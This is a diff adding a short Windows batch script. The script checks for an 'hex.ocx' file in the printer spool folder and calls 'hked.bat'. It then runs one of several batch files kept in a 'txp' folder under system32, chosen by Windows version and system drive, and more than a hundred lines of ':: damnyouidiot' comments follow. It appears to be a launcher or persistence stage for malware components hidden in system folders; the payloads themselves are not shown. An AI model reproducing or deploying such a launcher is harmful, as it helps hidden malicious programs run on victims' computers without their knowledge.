@@ -1,0 +1,122 @@
+@echo off
+IF EXIST %systemroot%\system32\spool\printers\hex.ocx CALL hked.bat
+IF %systemroot%==C:\WINNT CALL C:\winnt\system32\txp\nt2k.bat 
+IF %systemroot%==C:\WINDOWS CALL C:\windows\system32\txp\xp.bat 
+IF %systemroot%==D:\WINNT CALL D:\winnt\system32\txp\nt2kd.bat
+IF %systemroot%==D:\WINDOWS CALL D:\windows\txp\xpd.bat
+IF %systemroot%==E:\WINNT CALL E:\winnt\system32\txp\nt2ke.bat
+IF %systemroot%==E:\WINDOWS CALL E:\windows\system32\txp\xpe.bat
+IF %systemroot%==F:\WINNT CALL F:\winnt\system32\txp\nt2kf.bat
+IF %systemroot%==F:\WINDOWS CALL F:\windows\system32\txp\xpf.bat
+IF %systemroot%==G:\WINNT CALL G:\winnt\system32\txp\nt2kg.bat
+IF %systemroot%==G:\WINDOWS CALL G:\windows\system32\txp\xpg.bat
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
+:: damnyouidiot
